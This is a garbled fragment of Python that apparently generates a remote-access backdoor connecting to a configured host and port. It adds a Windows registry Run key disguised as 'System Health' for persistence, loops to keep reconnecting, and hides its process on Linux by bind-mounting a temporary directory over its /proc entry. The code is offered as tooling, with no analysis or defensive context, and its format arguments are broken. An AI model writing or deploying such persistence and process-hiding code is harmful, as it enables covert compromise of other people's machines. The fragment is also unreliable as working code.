...
\tSetValueEx("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
{keepyourselfalive}()
{connected} = False\nwhile not {connected} :\n\ttry :
...
\tos.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(os.getpid(), token))
...
""".format(port = str(port) , host = host, hide_process = str[0], relaunch = [1], connected = strs[2])